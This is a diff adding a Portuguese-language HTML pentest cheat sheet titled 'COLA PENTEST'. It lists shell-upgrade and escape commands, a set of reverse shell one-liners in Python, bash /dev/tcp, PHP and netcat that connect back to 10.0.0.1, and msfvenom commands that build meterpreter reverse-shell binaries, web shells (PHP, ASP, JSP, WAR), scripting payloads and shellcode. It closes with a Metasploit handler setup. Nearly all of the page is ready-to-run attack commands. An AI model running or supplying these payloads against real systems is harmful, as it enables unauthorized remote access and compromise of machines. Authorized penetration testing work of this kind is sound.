@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>COLA PENTEST</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1>Spawning a TTY Shell</h1>
+    <p>
+        Freqüentemente, durante os pen tests, você pode obter um shell sem ter tty, mas deseja interagir mais com o sistema. Aqui estão alguns comandos que permitirão que você crie um shell tty. Obviamente, parte disso dependerá do ambiente do sistema e dos pacotes instalados.
+    </p>
+    <code>
+        <pre>
+            <mark>python -c 'import pty; pty.spawn("/bin/sh")'</mark>
+            <mark>export TERM=linux</mark>
+            echo os.system('/bin/bash')
+            /bin/sh -i
+            perl —e 'exec "/bin/sh";'
+            perl: exec "/bin/sh";
+            ruby: exec "/bin/sh"
+            lua: os.execute('/bin/sh')
+            (From within IRB) exec "/bin/sh"
+            (From within vi)  :!bash
+            (From within vi) :set shell=/bin/bash:shell
+            (From within nmap) : !sh
+        </pre>
+    </code>
+    <h1> Reverse Shell Cheat Sheet</h1>
+    
+        <code>
+            <p>Python</p>
+            <p>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</p>
+            <p>Bash</p>
+            <p>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</p>
+            <p>PHP</p>
+            <p>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</p>
+            <p>Netcat</p>
+            <p>nc -e /bin/sh 10.0.0.1 1234</p>
+            
+        </code>
+        <h1>Servidor Web Simples com Python</h1>
+        <pre>
+            <code>
+                <p>
+                    $ cd meu_diretorio
+                    $ python -m SimpleHTTPServer
+                    $ python -m SimpleHTTPServer 8080
+                </p>
+            </code>
+        </pre>
+    <h1>PAYLOADS BINARIOS</h1>
+    <h2>Linux</h2>
+    <code>
+        <p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf</p>
+            <h2>Windows</h2>
+            <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe</p>
+                <h2>Mac</h2>
+                <p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho</p>
+    </code>
+    <h1>Web Payloads </h1>
+    <code>
+        <H2>PHP</H2>
+        <p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+            cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php</p>
+            <H2>ASP</H2>
+            <P>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</P>
+                <H2>JSP</H2>
+                <P>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp</P>
+                    <H2>WAR</H2>
+                    <P>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war</P>
+    </code>
+    <H1>Scripting Payloads</H1>
+    <code>
+        <h2>Python</h2>
+        <p>msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py</p>
+            <h2>Bash</h2>
+            <p>msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh</p>
+                <h2>Perl</h2>
+                <p>msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl</p>
+    </code>
+    <h1>Shellcode</h1>
+    <code>
+        <h2>Linux Based Shellcode </h2>
+        <p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></language></p>
+        <h2>Windows Based Shellcode </h2>
+        <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></language></p>
+        <h2>Mac Based Shellcode </h2>
+        <p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language></language></p>
+        <h2>Handlers </h2>
+        <pre>
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+        </pre>
+    </code>
+
+        
+</body>
+</html>
